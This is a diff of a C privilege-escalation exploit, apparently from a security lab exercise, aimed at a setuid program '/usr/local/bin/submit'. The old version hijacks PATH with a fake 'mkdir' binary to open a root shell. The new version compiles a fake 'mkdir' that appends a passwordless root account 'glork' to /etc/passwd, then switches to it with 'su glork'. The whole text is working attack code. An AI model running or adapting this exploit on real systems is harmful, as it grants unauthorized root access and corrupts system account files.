@@ -4,30 +4,44 @@
 #include <sys/wait.h>
 
 #define TARGET "/usr/local/bin/submit"
-#define DEFAULT_PATH "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
 
-int main(void)
-{
-  char *args[] = { TARGET, "mkdir", NULL, NULL };
-  char *env[] = { "PATH=/share", NULL };
+int main(void) {
+    char *args[] = { "", "none", NULL, NULL };
+    char *env[] = { NULL };
 
-  // Write C program to file
-  FILE *fp = fopen("hax.c", "w+");
-  fprintf(fp,
-          "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
-          "int main(void) {"
-                "setenv(\"PATH\", \"%s\", 1);"  // Reset overwritten path
-                "system(\"/bin/sh\");"          // Open bash session (as root)
-                "exit(0);"
-                "}"
-          , DEFAULT_PATH);
-  fclose(fp);
+    pid_t pid;
+    int i;
 
-  // Compile
-  system("gcc hax.c -o mkdir");
+    // Write C program to file
+    FILE *fp = fopen("hax.c", "w+");
+    fputs("#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
+                    "int main(void) {"
+                    "system(\"userdel glork\");"
+                    "system(\"echo \\n >> /etc/passwd && echo 'glork::0:0:glork::/bin/sh' >> /etc/passwd\");"
+                    "exit(0);"
+                    "}"
+            , fp);
+    fclose(fp);
 
-  if (execve(TARGET, args, env) < 0)
-    fprintf(stderr, "execve failed.\n");
+    // Compile
+    system("gcc hax.c -o mkdir");
 
-  exit(0);
+
+    pid = fork();
+
+    if(pid < 0) {
+        fprintf(stderr, "fork failed.\n");
+    }
+    else if(pid == 0) {  // Child
+        if (execve(TARGET, args, env) < 0)
+            fprintf(stderr, "execve failed.\n");
+    }
+    else { // Parent
+        waitpid(pid, &i, 0);
+        system("su glork");
+
+        exit(0);
+    }
+
+    exit(0);
 }
